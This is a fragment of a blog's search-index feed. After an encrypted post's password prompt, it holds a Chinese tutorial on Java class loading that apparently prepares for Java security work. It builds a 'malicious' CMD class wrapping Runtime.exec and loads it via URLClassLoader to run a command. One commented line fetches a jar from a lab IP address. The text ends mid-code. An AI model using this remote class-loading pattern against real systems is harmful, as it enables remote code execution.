a5b9ffb830e61157b5b26398ed6be505f9afe746fc34777af7eeddf1ce8014e1ed36d0162e7c4cfd147f59c15dc166fd841993c59e3032be16c2815f59688cf35820920cc2ad104648a6522fdfbca983d2266a4e0500151621c2566e76ff779df9974c5b0868dce94e3bd3a1e4399eb58d896f7a55b5be0d4e5f7faa9259f745c16b1dba9846a306f5d55be1a41cb0b01ed778e99096a7ec4166aee7aaeebc80135ac1b3ab2842465644d1e33e941fecbe6a5ee4a21cb19bf0b56b84d5efb7c81a311fdfbff1990ed23b9c326f916087223bfab6ae5e69e72c6bb30ef0d5b2572970157031cde03430a208a079c05a05a4968a78137b2b137de45933685eb49afb326c1f1b1db4293e2e5ba209115a057ffc107601c9b546fb31eeeea612669811b618c8733ec5e0ad5143b9d05945d7</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java类加载机制</title>
      <link href="/p/6d27f500.html"/>
      <url>/p/6d27f500.html</url>
      
        <content type="html"><![CDATA[<p>Java程序在运行前需要先编译成<code>class文件</code>，Java类初始化的时候会调用<code>java.lang.ClassLoader</code>加载类字节码，<code>ClassLoader</code>会调用JVM的native方法（<code>defineClass0/1/2</code>）来定义一个<code>java.lang.Class</code>实例。</p><h1 id="class文件"><a href="#class文件" class="headerlink" title="class文件"></a>class文件</h1><p>Java字节码类文件（.class）是Java编译器编译Java源文件（.java）产生的“目标文件”。它是一种8位字节的二进制流文件。</p><h1 id="Java类加载机制"><a href="#Java类加载机制" class="headerlink" title="Java类加载机制"></a>Java类加载机制</h1><p>主要作用：Java类文件的加载进内存</p><p>Bootstrap ClassLoader（引导类加载器）</p><p>Extension ClassLoader（扩展类加载器）</p><p>App ClassLoader（系统类加载器）—默认的类加载器</p><blockquote><p><code>ClassLoader.getSystemClassLoader()</code>返回的系统类加载器也是AppClassLoader，见示例。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test5</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">        ClassLoader loader1 = ClassLoader.getSystemClassLoader();</span><br><span class="line">        System.out.println(loader1);</span><br><span class="line">        ClassLoader loader2 = loader1.getParent();</span><br><span class="line">        System.out.println(loader2);</span><br><span class="line">        ClassLoader loader3 = loader2.getParent();</span><br><span class="line">        System.out.println(loader3);</span><br><span class="line">        String className = <span class="string">&quot;java.io.File&quot;</span>;</span><br><span class="line">        Class clazz2 = Class.forName(className);</span><br><span class="line">        ClassLoader loader4 = clazz2.getClassLoader();</span><br><span class="line">        System.out.println(loader4);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>通过引导类加载器加载（该类加载器实现于JVM层，采用C++编写）,获取一个类的类加载器时候会返回一个<code>null</code>值，如<code>loader3</code></p><p><code>java.io.File</code>类同理间<code>loader4</code></p></blockquote><h3 id="双亲委派"><a href="#双亲委派" class="headerlink" title="双亲委派"></a>双亲委派</h3><p>一个java类加载进JVM内存的过程</p><ol><li>每个类加载器对他加载过的类都有缓存</li><li>向上委托查找，向下委托加载</li></ol><h3 id="JDK的类加载对象"><a href="#JDK的类加载对象" class="headerlink" title="JDK的类加载对象"></a>JDK的类加载对象</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader -&gt; SecureClassLoader -&gt; URLClassLoader -&gt; ExtClassLoader,AppClassLoader</span><br></pre></td></tr></table></figure><h2 id="ClassLoader类"><a href="#ClassLoader类" class="headerlink" title="ClassLoader类"></a>ClassLoader类</h2><p>抽象类，主要功能：通过指定的类名称，找到或生成对应的字节码，返回<code>java.lang.Class</code>类的实例。</p><p><code>ClassLoader</code>类有如下和加载类相关的方法：</p><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td><code>getParent()</code></td><td>返回该类加载器的父类加载器</td></tr><tr><td><code>loadClass(String name)</code></td><td>加载指定的Java类</td></tr><tr><td><code>findClass(String name)</code></td><td>查找指定的Java类</td></tr><tr><td><code>findLoadedClass(String name)</code></td><td>查找JVM已经加载过的类</td></tr><tr><td><code>defineClass(String name,byte[] b,int off,int len)</code></td><td>字节数组b转成Java类</td></tr><tr><td><code>resolveClass</code></td><td>链接指定的Java类</td></tr></tbody></table><h2 id="ClassLoader作用"><a href="#ClassLoader作用" class="headerlink" title="ClassLoader作用"></a>ClassLoader作用</h2><p>根据文件地址获取输入流</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader loader = <span class="keyword">this</span>.getClass().getClassLoader();</span><br><span class="line">        InputStream is = loader.getResourceAsStream(<span class="string">&quot;com\\drop\\test\\jdbc.properties&quot;</span>);</span><br><span class="line">        Properties pros = <span class="keyword">new</span> Properties();</span><br><span class="line">        pros.load(is);</span><br><span class="line">        String name = pros.getProperty(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        System.out.println(name);</span><br></pre></td></tr></table></figure><h2 id="Java类动态加载机制"><a href="#Java类动态加载机制" class="headerlink" title="Java类动态加载机制"></a>Java类动态加载机制</h2><p>显式：通常使用<code>Java反射</code>或者<code>ClassLoader</code>来动态加载一个类对象。</p><p>隐式：<code>类名.方法名()</code>或<code>new</code>类实例</p><p><strong>常用的类动态加载方式：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//默认会初始化被加载类的静态属性和方法</span></span><br><span class="line">Class clazz2 = Class.forName(<span class="string">&quot;java.io.File&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//默认不会初始化类方法</span></span><br><span class="line">ClassLoader classLoader = <span class="keyword">this</span>.getClass().getClassLoader(<span class="string">&quot;java.io.File&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="自定义ClassLoader"><a href="#自定义ClassLoader" class="headerlink" title="自定义ClassLoader"></a>自定义ClassLoader</h2><ol><li>继承一个系统类加载器。</li><li>覆盖父类的findClass方法。</li><li>在方法中，调用defineClass方法在JVM内存中定义一个类。</li></ol><p>自己的类加载器来实现加载自定义的字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drop.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;</span><br><span class="line">    <span class="comment">// TestHelloWorld类名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String testClassName = <span class="string">&quot;com.drop.test.TestHelloWorld&quot;</span>;</span><br><span class="line">    <span class="comment">// TestHelloWorld类字节码</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] testClassBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;</span><br><span class="line">            -<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">104</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">70</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">84</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">87</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">32</span>, <span class="number">87</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">126</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">47</span>, <span class="number">100</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">112</span>, <span class="number">47</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">84</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">87</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">79</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">42</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">2</span>, -<span class="number">80</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">12</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123; <span class="comment">//使用自定义类加载器重写findClass方法</span></span><br><span class="line">        <span class="comment">// 只处理TestHelloWorld类</span></span><br><span class="line">        <span class="keyword">if</span> (name.equals(testClassName)) &#123;</span><br><span class="line">            <span class="comment">// 调用defineClass方法的时候传入TestHelloWorld类的字节码的方式来向JVM中定义一个TestHelloWorld类</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(testClassName, testClassBytes, <span class="number">0</span>, testClassBytes.length);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 创建自定义的类加载器</span></span><br><span class="line">        TestClassLoader loader = <span class="keyword">new</span> TestClassLoader();</span><br><span class="line">        <span class="comment">//使用自定义的类加载器加载TestHelloWorld类</span></span><br><span class="line">        Class testClass = loader.loadClass(testClassName);</span><br><span class="line">        <span class="comment">// 反射创建TestHelloWorld类，等价于 TestHelloWorld t = new TestHelloWorld();</span></span><br><span class="line">        Object testInstance = testClass.newInstance();</span><br><span class="line">        <span class="comment">// 反射获取hello方法</span></span><br><span class="line">        Method method = testInstance.getClass().getMethod(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="comment">// 反射调用hello方法,等价于 String str = t.hello();</span></span><br><span class="line">        String str = (String) ((Method) method).invoke(testInstance);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="字节码生成代码："><a href="#字节码生成代码：" class="headerlink" title="字节码生成代码："></a>字节码生成代码：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drop.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">toByteArray</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] toByteArray(String filePath) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//filePath = &quot;F:\\IdeaProjects\\test\\src\\com\\drop\\test\\TestHelloWorld.class&quot;;</span></span><br><span class="line">        InputStream inputStream = <span class="keyword">new</span> FileInputStream(filePath);</span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span> * <span class="number">4</span>];</span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((n = inputStream.read(bytes)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(bytes, <span class="number">0</span>, n);</span><br><span class="line">        &#125;</span><br><span class="line">        inputStream.close();</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        toByteArray tb = <span class="keyword">new</span> toByteArray();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(tb.toByteArray(<span class="string">&quot;F:\\IdeaProjects\\test\\src\\com\\drop\\test\\TestHelloWorld.class&quot;</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h1><p><code>java.lang.ClassLoader</code>是所有的类加载器的父类，<code>java.lang.ClassLoader</code>有非常多的子类加载器，比如我们用于加载jar包的<code>java.net.URLClassLoader</code>其本身通过继承<code>java.lang.ClassLoader</code>类，重写了<code>findClass</code>方法从而实现了加载目录class文件甚至是远程资源文件。</p><h2 id="构造恶意类"><a href="#构造恶意类" class="headerlink" title="构造恶意类"></a>构造恶意类</h2><h3 id="static方法"><a href="#static方法" class="headerlink" title="static方法"></a>static方法</h3><p>在没有创建对象的情况下来进行调用（方法/变量）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drop.test;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CMD</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Process <span class="title">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="远程调用"><a href="#远程调用" class="headerlink" title="远程调用"></a>远程调用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drop.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestURLClassLoader</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 定义远程加载的jar路径,jar中是CMD.java的class文件</span></span><br><span class="line">            <span class="comment">//URL url = new URL(&quot;http://192.168.47.128:8000/tool.jar&quot;);</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 定义远程加载本地java文件</span></span><br><span class="line">            File f = <span class="keyword">new</span> File(<span class="string">&quot;F:\\IdeaProjects\\test\\src\\com\\drop\\test\\CMD.java&quot;</span>);</span><br><span class="line">            URL url = f.toURL();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建URLClassLoader对象，并加载远程jar包</span></span><br><span class="line">            URLClassLoader curl = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;url&#125;);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 定义需要执行的系统命令</span></span><br><span class="line">            String cmd = <span class="string">&quot;calc&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//定义远程加载的jar路径,这里写包的路径</span></span><br><span class="line">            <span class="comment">//Class cmdClass = curl.loadClass(&quot;CMD&quot;);</span></span><br><span class="line">            <span class="comment">// 通过URLClassLoader加载远程jar包中的CMD类</span></span><br><span class="line">            Class&lt;?&gt; cmdClass = curl.loadClass(<span class="string">&quot;com.drop.test.CMD&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用CMD类中的exec方法，等价于: Process process = CMD.exec(&quot;whoami&quot;);</span></span><br><span class="line">            Process process = (Process) cmdClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(<span class="keyword">null</span>,cmd);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取命令执行结果的输入流</span></span><br><span class="line">            InputStream in = process.getInputStream();</span><br><span class="line">            ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 读取命令执行结果</span></span><br><span class="line">            <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 输出命令执行结果</span></span><br><span class="line">            System.out.println(baos.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220104151915409.png" alt="image-20220104151915409"></p><h1 id="类加载隔离"><a href="#类加载隔离" class="headerlink" title="类加载隔离"></a>类加载隔离</h1><p><img src="https://javasec.oss-cn-hongkong.aliyuncs.com/images/202110251829223.png" alt="image-20211025171150475"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drop.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.drop.test.TestClassLoader.testClassBytes;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.drop.test.TestClassLoader.testClassName;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestCrossClassLoader</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderA</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span 